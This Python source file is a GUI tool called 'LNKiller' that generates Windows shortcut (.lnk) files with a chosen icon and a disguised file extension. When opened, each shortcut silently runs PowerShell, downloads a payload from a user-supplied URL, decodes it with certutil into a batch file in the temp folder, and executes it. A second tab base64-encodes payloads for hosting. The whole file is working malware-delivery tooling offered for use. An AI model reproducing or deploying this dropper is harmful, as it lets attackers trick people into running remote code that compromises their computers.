import os
import tkinter as tk
from tkinter import ttk, filedialog
import win32com.client
import base64
import random
import string

def browse_icon():
    initial_dir = os.path.join(os.getcwd(), "icons")
    filename = filedialog.askopenfilename(initialdir=initial_dir, filetypes=[("Icon Files", "*.ico")])
    icon_entry.delete(0, tk.END)
    icon_entry.insert(0, filename)

def browse_file():
    initial_dir = os.getcwd()
    filename = filedialog.askopenfilename(initialdir=initial_dir)
    if filename:
        with open(filename, "rb") as file:
            file_bytes = file.read()
            encoded_bytes = base64.b64encode(file_bytes)
            file_content = encoded_bytes.decode("utf-8")
        file_extension = os.path.splitext(filename)[1]
        save_file(file_content, file_extension)

def save_file(content, file_extension):
    filename = filedialog.asksaveasfilename(defaultextension=file_extension)
    if filename:
        with open(filename, "wb") as file:  
            file.write(content.encode("utf-8"))  

def create_shortcut():
    target_path = target_entry.get()
    shortcut_path = shortcut_entry.get()
    icon_path = icon_entry.get()
    if not icon_path:
        icon_path = os.path.join(os.getcwd(), "icons", "lnkiller.ico")
    start_in = start_in_entry.get()
    run_maximized = maximized_var.get()

    payload_url = target_entry.get()
    file_extension = os.path.splitext(payload_url)[1]
    
    print("File extension found:", file_extension)  

    create_lnk(target_path, shortcut_path, icon_path, start_in, run_maximized, file_extension)
    result_label.config(text="Shortcut created successfully!", foreground="white", background="#2e2e2e")

def create_lnk(target_path, shortcut_path, icon_path=None, start_in="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\", run_maximized=False, file_extension=""):
    target = os.path.abspath(target_path)
    if not shortcut_path.endswith(".lnk"):
        shortcut_path = shortcut_path + ".lnk"
    shortcut = os.path.abspath(shortcut_path)

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut)
    tmpName = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
    finalName = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
    while tmpName == finalName:
        tmpName = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
    shortcut.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    shortcut.Arguments =f" -command \"Invoke-WebRequest -Uri {target_path} -OutFile $env:temp\\{tmpName}.cer;certutil -decode $env:temp\\{tmpName}.cer $env:temp\\{finalName}.bat;Start-Process \"$env:temp\\{finalName}.bat\"\""

    if icon_path:
        shortcut.IconLocation = icon_path

    if start_in:
        shortcut.WorkingDirectory = os.path.abspath(start_in)

    if run_maximized:
        shortcut.WindowStyle = 3  
    else:
        shortcut.WindowStyle = 7  

    if file_extension and not shortcut_path.endswith(file_extension):
        shortcut_path += file_extension

    shortcut.save()

root = tk.Tk()
root.title("LNKiller")
root.configure(bg="#2e2e2e")

# Set app icon
icon_path = os.path.join(os.getcwd(), "icons", "lnkiller.ico")
if os.path.exists(icon_path):
    root.iconbitmap(default=icon_path)

# Define custom style for frames
style = ttk.Style()
style.configure("Dark.TFrame", background="#2e2e2e")

tab_control = ttk.Notebook(root)
tab_control.pack(expand=1, fill="both")

generate_lnk_tab = ttk.Frame(tab_control, style="Dark.TFrame")
tab_control.add(generate_lnk_tab, text="Generate LNK")

target_label = ttk.Label(generate_lnk_tab, text="Payload URL:", background="#2e2e2e", foreground="white")
target_label.grid(row=0, column=0, sticky="w")
target_entry = ttk.Entry(generate_lnk_tab, width=40)
target_entry.grid(row=0, column=1, padx=(0, 10))

shortcut_label = ttk.Label(generate_lnk_tab, text="Shortcut Name:", background="#2e2e2e", foreground="white")
shortcut_label.grid(row=1, column=0, sticky="w")
shortcut_entry = ttk.Entry(generate_lnk_tab, width=40)
shortcut_entry.grid(row=1, column=1, padx=(0, 10))

icon_label = ttk.Label(generate_lnk_tab, text="Icon File:", background="#2e2e2e", foreground="white")
icon_label.grid(row=2, column=0, sticky="w")
icon_entry = ttk.Entry(generate_lnk_tab, width=30)
icon_entry.grid(row=2, column=1, padx=(0, 5))
browse_button_icon = ttk.Button(generate_lnk_tab, text="Browse", command=browse_icon)
browse_button_icon.grid(row=2, column=2)

start_in_label = ttk.Label(generate_lnk_tab, text="Start In (Optional):", background="#2e2e2e", foreground="white")
start_in_label.grid(row=3, column=0, sticky="w")
start_in_entry = ttk.Entry(generate_lnk_tab, width=40)
start_in_entry.grid(row=3, column=1, padx=(0, 10))

maximized_var = tk.BooleanVar()
style.configure("Custom.TCheckbutton", background="#2e2e2e")
maximized_check = ttk.Checkbutton(generate_lnk_tab, text="Run Maximized (Debug)", variable=maximized_var, style="Custom.TCheckbutton")
maximized_check.grid(row=5, column=0, columnspan=2, sticky="w")

create_button = ttk.Button(generate_lnk_tab, text="Create Shortcut", command=create_shortcut)
create_button.grid(row=6, column=0, columnspan=2, pady=(10, 0))

result_label = ttk.Label(generate_lnk_tab, text="", background="#2e2e2e", foreground="white")
result_label.grid(row=7, column=0, columnspan=2)

generate_file_tab = ttk.Frame(tab_control, style="Dark.TFrame")
tab_control.add(generate_file_tab, text="Generate File")

instruct = ttk.Label(generate_file_tab, text="This will encode your payload in base64.\nPlease save it with the exact same extension as your normal payload.", background="#2e2e2e", foreground="white")
instruct.grid(row=0, column=1, sticky="w")

browse_button_file = ttk.Button(generate_file_tab, text="Browse", command=browse_file)
browse_button_file.grid(row=1, column=1)

root.mainloop()
